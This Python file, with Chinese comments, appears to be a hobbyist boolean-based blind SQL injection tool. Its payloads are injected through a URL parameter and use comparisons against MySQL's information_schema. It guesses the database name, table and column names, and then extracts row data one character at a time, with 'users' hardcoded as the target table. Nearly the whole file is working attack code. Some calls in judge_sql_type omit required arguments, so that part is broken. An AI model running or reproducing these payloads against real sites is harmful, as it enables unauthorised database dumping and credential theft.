from includee import printf
from includee import judge_sql_inject
dic = 'abcdefghijklmnopqrstuvwxyz1234567890'
def sql_blind_attack(url, headers):  # 盲注攻击
    databaselen = 0
    for i in range(100):  # 猜解数据库长度
        printf("正在猜解数据库名长度...")
        sql = f"1'+and+length(database())%3D{i}%23"
        if judge_sql_inject(sql,url,headers) == 1:
            databaselen = i;
            break
    printf("数据库长度为:" + str(databaselen))
    databasename = '';
    for i in range(databaselen):  # 拆解数据库名
        for j in dic:
            sql = f"1'+and+substr(database()%2C{i + 1}%2C1)%3D'{j}'%23"
            if judge_sql_inject(sql,url,headers) == 1:
                databasename += j
                break
    printf("数据库名为:" + databasename)
    printf("是否继续，y/N  ")
    n = input()
    if n == 'y' or n == 'Y':
        printf("正在继续")
    else:
        quit()
    printf("正在猜解数据库" + databasename + "的表信息...")
    table_num = 0
    for i in range(999):  # 猜解数据库有几张表
        sql = f"1'+and+(select+count(table_name)+from+information_schema.tables+where+table_schema%3D'{databasename}')%3D{i}%23"
        # sql = f"1' and (select count(table_name) from information_schema.tables where table_schema='{databasename}')={i}#"
        if judge_sql_inject(sql,url,headers) == 1:
            table_num = i;
            break
    printf("数据库" + databasename + "共有" + str(table_num) + "张表")
    # 猜解所有表名长度
    table_len = []
    for i in range(table_num):
        for j in range(99):
            sql = f"1'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{databasename}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            # sql = f"1' and length(substr((select table_name from information_schema.tables where table_schema={databasename} limit {i},1),1))={j}#"
            if judge_sql_inject(sql,url,headers) == 1:
                table_len.append(j)
                break

    # 猜解所有表名
    table_name = []
    for i in range(table_num):
        tmp = ''
        for j in range(table_len[i]):
            for k in dic:
                tj = ord(k)
                sql = f"1'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{databasename}'+limit+{i}%2C1)%2C{j + 1}))%3D{tj}%23"
                # sql = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema={databasename} limit {i},1),{j+1}))='{k}'#"
                if judge_sql_inject(sql,url,headers) == 1:
                    tmp += k
                    break
        table_name.append(tmp)
    # 显示所有表信息
    printf("正在打印所有表信息...")
    print("\033[0;33m-\033[0m" * 20)
    j = 1
    for i in table_name:
        str1 = f'[{j}]'
        print(str1 + i)
        j += 1
    print("\033[0;33m-\033[0m" * 20)
    printf('请输入你想要查看的表名:')
    chose_table_name = input()
    # 猜解想要知道的表内的列信息
    printf("正在猜解表" + chose_table_name + "的信息...")
    # 猜解字段数
    column_num = 0
    for i in range(999):
        sql = f"1'+and+(select+count(column_name)+from+information_schema.columns+where+table_schema%3Ddatabase()+and+table_name%3D'{chose_table_name}')%3D{i}+%23"
        # sql = f"1' and (select count(column_name) from information_schema.columns where table_name={chose_table_name})={i}#"
        if judge_sql_inject(sql,url,headers) == 1:
            column_num = i
            break
    printf("表" + chose_table_name + "的字段数为:" + str(column_num))
    # 猜解每个字段的长度
    column_len = []
    for i in range(column_num):
        for j in range(999):
            sql = f"1'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{chose_table_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
            # sql = f"1' and length(substr((select column_name from information_schema.columns where table_name={chose_table_name} limit {i},1),1))={j}#"
            if judge_sql_inject(sql,url,headers) == 1:
                column_len.append(j)
                break
    # 猜解每个字段名
    column_name = []
    for i in range(column_num):
        tmp = ''
        for j in range(column_len[i]):
            for k in dic:
                tk = ord(k)
                sql = f"1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{chose_table_name}'+limit+{i}%2C1)%2C{j + 1}))%3D{tk}%23"
                # sql = f"1' and ascii(substr((select column_name from information_schema.columns where table_name={chose_table_name} limit {i},1),{j+1}))='{k}'#"
                if judge_sql_inject(sql,url,headers) == 1:
                    tmp += k
                    break
        column_name.append(tmp)
    # 显示字段名
    printf("正在打印" + chose_table_name + "表的所有字段")

    while True:
        print("\033[0;33m-\033[0m" * 20)
        num = 1
        for i in column_name:
            n = f"[{num}]"
            print(n + i)
            num += 1
        print("\033[0;33m-\033[0m" * 20)
        printf("请选择想要查看的字段信息,退出请输入!q")
        column_in = input()
        if column_in == '!q':
            printf("注入结束")
            quit()
        else:
            data = []
            for i in range(5):
                str_tmp = ''
                for j in range(1, 20):
                    for k in dic:
                        tk = ord(k)
                        # sql = f"1' and ascii(substr((select {column_in} from {chose_table_name} limit {i},1),{j},1))={tk}#"
                        sql = f"1'+and+ascii(substr((select+{column_in}+from+users+limit+{i}%2C1)%2C{j}%2C1))%3D{tk}%23"
                        # sql = f"1' and ascii(substr((select {column_in} from users limit {i},1),{j},1))={tk}#"
                        if judge_sql_inject(sql,url,headers) == 1:
                            str_tmp += k
                            break
                if str_tmp != '':
                    data.append(str_tmp)
                    print(data)

            if len(data) != 0:
                printf("正在打印" + column_in)
                print("\033[0;33m-\033[0m" * 20)
                num = 1
                for i in data:
                    n = f"[{num}]"
                    print(n + i)
                    num += 1
            else:
                printf("无信息")

def judge_sql_type():  # 判断sql注入类型，字符型or数字型
    if judge_sql_inject("1' and '1'='1") != judge_sql_inject("1' and '1'='2"):
        print("\033[1;31m[INFO]\033[0m可能存在注入点，注入类型为字符型")
        sql_blind_attack()
    elif judge_sql_inject("1 and 1=1") != judge_sql_inject("1 and 1=2"):
        print("\033[1;31m[INFO]\033[0m可能存在注入点，注入类型为数字型")
        sql_blind_attack()
    else:
        print("\033[1;31m[INFO]\033[0m找不到注入点，退出")
        quit()